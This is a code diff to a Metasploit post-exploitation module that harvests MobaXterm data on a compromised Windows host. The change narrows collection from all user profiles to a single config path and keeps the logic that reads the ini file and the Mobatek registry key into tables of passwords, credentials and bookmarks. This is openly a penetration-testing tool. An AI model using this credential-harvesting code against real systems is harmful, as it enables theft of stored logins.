@@ -308,48 +308,24 @@ class MetasploitModule < Msf::Post
       ]
     )
     print_status("Gathering MobaXterm session information from #{sysinfo['Computer']}")
-    if datastore['CONFIG_PATH']
-      ini_config_path = datastore['CONFIG_PATH']
-      print_status("Specifies the config file path for MobaXterm #{ini_config_path}")
-      config = parser_ini(ini_config_path)
-      if !config
-        return
-      end
+    ini_config_path = datastore['CONFIG_PATH'] || "#{registry_getvaldata("HKU\\#{session.sys.config.getsid}\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 'Personal')}\\MobaXterm\\MobaXterm.ini"
+    print_status("Specifies the config file path for MobaXterm #{ini_config_path}")
+    config = parser_ini(ini_config_path)
+    unless config
+      return
+    end
 
-      parent_key = "HKEY_USERS\\#{session.sys.config.getsid}\\Software\\Mobatek\\MobaXterm"
-      config['RegistryKey'] = parent_key
-      pws_result, creds_result, bookmarks_result = entry(config)
-      pws_result.each do |item|
-        pw_tbl << item.values
-      end
-      bookmarks_result.each do |item|
-        bookmarks_tbl << item.values
-      end
-      creds_result.each do |item|
-        creds_tbl << item.values
-      end
-    else
-      grab_user_profiles.each do |user|
-        next if user['MyDocs'].nil? && user['SID'] != session.sys.config.getsid
-
-        ini_config_path = "#{user['MyDocs']}\\MobaXterm\\MobaXterm.ini"
-        print_status("UserName: #{user['UserName']} Parsing file: " + ini_config_path)
-        config = parser_ini(ini_config_path)
-        next if !config
-
-        parent_key = "HKEY_USERS\\#{user['SID']}\\Software\\Mobatek\\MobaXterm"
-        config['RegistryKey'] = parent_key
-        pws_result, creds_result, bookmarks_result = entry(config)
-        pws_result.each do |item|
-          pw_tbl << item.values
-        end
-        bookmarks_result.each do |item|
-          bookmarks_tbl << item.values
-        end
-        creds_result.each do |item|
-          creds_tbl << item.values
-        end
-      end
+    parent_key = "HKEY_USERS\\#{session.sys.config.getsid}\\Software\\Mobatek\\MobaXterm"
+    config['RegistryKey'] = parent_key
+    pws_result, creds_result, bookmarks_result = entry(config)
+    pws_result.each do |item|
+      pw_tbl << item.values
+    end
+    bookmarks_result.each do |item|
+      bookmarks_tbl << item.values
+    end
+    creds_result.each do |item|
+      creds_tbl << item.values
     end
 
     if pw_tbl.rows.count > 0
